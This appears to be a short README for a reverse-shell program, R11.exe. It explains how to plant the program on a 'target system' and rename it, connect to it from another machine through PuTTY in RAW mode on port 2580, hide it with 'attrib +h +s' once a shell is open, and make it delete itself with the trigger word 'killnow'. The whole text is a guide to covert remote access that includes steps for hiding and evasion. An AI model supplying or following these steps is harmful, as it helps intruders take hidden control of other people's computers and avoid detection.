This is a reverse shell setup. You can run it on any local system and log in through PuTTY.

Copy the R11.exe file to any directory on the target system. You can also rename the executable if you wish.

Run the R11.exe file on the target system.

Login from another system using PuTTY:
Target ip : target system ip
Port number: 2580

Protocol: RAW

Once you gain shell access, hide the R11.exe by running the following command: attrib +h +s "R11.exe"

There is a trigger word killnow.

Typing "killnow" will cause the executable to delete itself.

Before deleting the executable, make sure to remove its attributes by running: attrib -h -s "R11.exe"

